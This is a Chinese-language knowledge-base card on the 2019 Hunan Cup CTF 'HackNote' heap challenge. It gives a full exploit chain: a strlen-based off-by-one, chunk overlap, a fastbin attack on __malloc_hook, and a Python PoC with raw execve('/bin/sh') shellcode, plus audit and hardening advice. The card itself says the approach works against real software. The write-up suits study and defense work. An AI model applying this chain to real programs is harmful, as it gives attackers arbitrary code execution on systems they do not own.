---
id: binary-pwn-heap-hunan-cup-2019-hacknote-offbyone-strlen-size-overlap-fastbin-malloc-hook-shellcode
title: 湖湘杯 2019 HackNote：edit 用 strlen 重算大小制造 off-by-one，篡改相邻 chunk size 成 chunk overlap，fastbin attack 改 __malloc_hook 执行 shellcode
type: scenario
domain: binary
path: binary/pwn/heap
technique: hacknote-strlen-offbyone-size-overlap-fastbin-malloc-hook
tags:
- pwn
- heap
- off-by-one
- glibc
- fastbin-attack
- malloc-hook
- shellcode
- ctf
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V679
  verified_at: '2026-11-13T12:21:13+08:00'
  notes: 已对照原文核对：edit 后 stored_size=strlen(chunk) 重算、第一次写满无 \x00 使 strlen 计入下一 chunk size 0x21、第二次 edit 多写 1 字节改 size 为 0x61，与原文 exp 及 img04/06/07 一致；静态 binary __malloc_hook=0x6CB788 固定址，fastbin 伪造 p64(malloc_hook-0x16) 后 hook→malloc_hook+8 shellcode，img07 有 getshell 现场；已修正利用步骤第5步：第一次 add(0x30) 取回被 overlap 覆盖的 chunk2，第二次 add(0x30,...) 才返回 __malloc_hook-0x16。原文未标 glibc/受影响版本，affected_versions 保持为空；与既有同 sink 卡起点/终点原语不同，append 理由成立。PoC 未本机复跑。
url: /docs/binary/pwn/heap/binary-pwn-heap-hunan-cup-2019-hacknote-offbyone-strlen-size-overlap-fastbin-malloc-hook-shellcode/
draft: false
kb_aliases:
- 湖湘杯 2019 HackNote
- HackNote off-by-one
- strlen 重算 size
- chunk overlap fastbin attack
- __malloc_hook shellcode
- 静态堆题 malloc_hook
---

## 一句话结论

在无 show、保护全关、静态编译的菜单堆题中，`edit` 先按存储的 size 读入、再用 `strlen(chunk)` 回写 size：先写满一个不带 `\x00` 的 chunk 让 `strlen` 越界读入下一 chunk 的 size 字段（如 0x21）把 size 变成「原长度 +1」，第二次 edit 就会多写 1 字节，把相邻 chunk 的 size 低字节改成 0x61；释放该块后得到覆盖后续 chunk 的 overlap 块，用 fastbin attack 在 `__malloc_hook` 附近伪造 chunk 并把 hook 指向紧随其后的 shellcode，任意一次 malloc 即执行 execve("/bin/sh") 拿 shell。

## 原理

- **off-by-one 的来源（strlen 重算）**：`add(size)` 保存申请大小；`edit(index)` 调 `readfile(ptr, stored_size)` 后执行 `stored_size = strlen(ptr)`。若第一次 edit 把 chunk 内容写满且末尾没有 `\x00`，`strlen` 会继续读物理相邻 chunk 的 size 字段（首字节 0x21 非零、次字节 0x00），于是返回「原长度 +1」并写回。第二次 edit 即按这个被放大的长度读取，允许写越界 1 字节——正好落在下一 chunk 的 size 低字节。
- **chunk overlap 的构造**：申请 0x18/0x10/0x30/0x10/0x30 五个块（index 0-4），对 index 0 执行上述两步，把 index 1 的 size 从 0x21 改成 0x61（伪造为 0x60 的块）。随后 `free(4); free(2); free(1)`：free(1) 时堆管理器按伪造的 0x60 大小处理，后续 `add(0x50)` 就会从这个「被扩大」的块分配，返回内存覆盖 index 2 的 chunk 头与内容，形成 overlap。
- **fastbin attack 到 __malloc_hook**：静态二进制中 `__malloc_hook` 地址固定（原文 0x6CB788）。在 overlap 块里写入 `p64(0)*3 + p64(0x41) + p64(malloc_hook - 0x16)` 伪造 fastbin chunk 并设置 fd；再 `add(0x30)` 即从 fastbin 取到 `malloc_hook - 0x16`。该块用户区从 `malloc_hook - 6` 开始：写入 6 个 `\x00` 后把 `__malloc_hook` 覆盖为 `malloc_hook + 8`，shellcode 紧随其后写在同一块里。
- **为什么能执行**：glibc 在 `malloc()` 入口检查 `__malloc_hook` 非空就跳转执行。hook 被改成指向自身 +8 处的 shellcode（execve("/bin/sh") 的 24 字节机器码），下一次 `add` 触发 malloc 即执行 shellcode；静态二进制无需泄露 libc，保护全关（无 PIE/CANARY/NX？原文 shellcode 位于堆上可执行，说明 NX 关闭）进一步降低难度。
- **前提**：无 show、看不到地址，因此不依赖 libc 泄露；edit 的大小重算逻辑与 `strlen` 越界是整条链的起点。

## 触发条件

- 菜单堆题：add/edit/delete（可无 show），二进制静态编译、保护全关或堆可执行。
- edit 的读入长度来自存储值且随后被 `strlen` 重算（或类似的长度回写逻辑），且第一次写满后 `strlen` 能读到下一 chunk 的 size 字段。
- 能精确控制相邻 chunk 的申请顺序与大小，使被篡改 size 的块落在可控位置。
- `__malloc_hook` 地址固定（静态/无 PIE）或已知。

## 利用步骤

1. 按布局申请：`add(0x18)`(0)、`add(0x10)`(1)、`add(0x30)`(2)、`add(0x10)`(3)、`add(0x30)`(4)。
2. 制造 off-by-one：`edit(0, b'a'*0x18)`（无 \x00，strlen 读入下一块 size 0x21 → 大小变 0x19）；再 `edit(0, b'a'*0x18 + p8(0x61))`，把 index1 的 size 低字节改为 0x61。
3. 释放：`free(4); free(2); free(1)`，让伪造大小的块进入对应 bin。
4. `add(0x50, p64(0)*3 + p64(0x41) + p64(malloc_hook - 0x16))`：从 overlap 块分配并伪造 fastbin chunk，fd 指向 `__malloc_hook - 0x16`。
5. `add(0x30)` 先从 fastbin 取回被 overlap 覆盖的 chunk2；随后 `add(0x30, b'\x00'*6 + p64(malloc_hook + 8) + shellcode)` 从伪造 fd 取到 `__malloc_hook - 0x16`，覆盖 `__malloc_hook` 并在其后写入 shellcode。
6. 再次 `add(0x10)` 触发 malloc → 执行 shellcode → getshell（原文后续 `interactive()`）。

## PoC

关键片段（原文 exp 精简，完整脚手架略）：

```python
malloc_hook = 0x6CB788                      # 静态 binary 固定地址
add(0x18); add(0x10); add(0x30); add(0x10); add(0x30)

edit(0, b'a'*0x18)                          # strlen 读到 next size 0x21 -> 存储大小 +1
edit(0, b'a'*0x18 + p8(0x61))               # off-by-one 改写 index1 size 低字节

free(4); free(2); free(1)                   # 伪造 0x60 大小的块进入 bin

add(0x50, p64(0)*3 + p64(0x41) + p64(malloc_hook - 0x16))  # overlap + fastbin fd
add(0x30)                                   # 取到 malloc_hook-0x16
shellcode = b'\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2\x48\x31\xf6\xb0\x3b\x0f\x05'
add(0x30, b'\x00'*6 + p64(malloc_hook + 8) + shellcode)    # hook -> shellcode
add(0x10)                                   # 触发 malloc_hook
```

原文在 GDB 中验证了 size 被改为 0x61、fastbin 链与 hook 写入，并在最终 add 后拿到 shell。PoC 未在本机复跑。

## 变体与关联

- [[binary-pwn-heap-glibc223-offbyone-size-extend-overlap-metadata-ptr-freehook]]：同属 off-by-one → size 扩展 → overlap → hook 的链，但该卡由 `stored_size+1` 读越界、目标是 __free_hook+system；本卡起点是 strlen 重算、目标是 __malloc_hook+shellcode。
- [[binary-pwn-heap-chunk-extend-size-overlap-unsorted-leak-fastbin-malloc-hook]]：直接改 adjacent size 的 overlap→fastbin→malloc_hook，可对照。
- [[binary-pwn-heap-metadata-array-offbyone-chunkptr-low-byte-heap-leak]]、[[binary-pwn-heap-note-offbyone-unlink-house-of-some-iofile]]：其它 off-by-one 变体。
- 变体：若二进制有 NX，可把 __malloc_hook 改为 one_gadget（需要 libc 泄露）；若有 PIE，可改 `__free_hook` 或用 unsorted bin 泄露。
- 边界：edit 的 size 重算若带边界检查、或下一块 size 低字节为 0x00（strlen 立即停止），该构造失效。

## 检测与防御

- 代码审计：检查 edit/read 后是否用 `strlen`/`strcpy` 回写长度作为后续读入上限；对写入长度做上限校验（≤ 申请大小），并确保缓冲区写入后补 `\0`。
- 编译加固：PIE + Full RELRO + NX + Stack Canary；glibc 新版本已移除 __malloc_hook/__free_hook，旧 hook 攻击面自然消失（但需替换为其它原语）。
- 检测（CTF/样本）：堆块 size 与申请大小不一致、fastbin 链中 fd 指向 libc/非堆地址、__malloc_hook 被写；GDB 中可观察 chunk size 低位异常。
- 说明：本卡为 CTF 场景的完整利用链记录，真实软件中的堆 off-by-one 同样可按此思路利用（需结合目标版本与保护）。
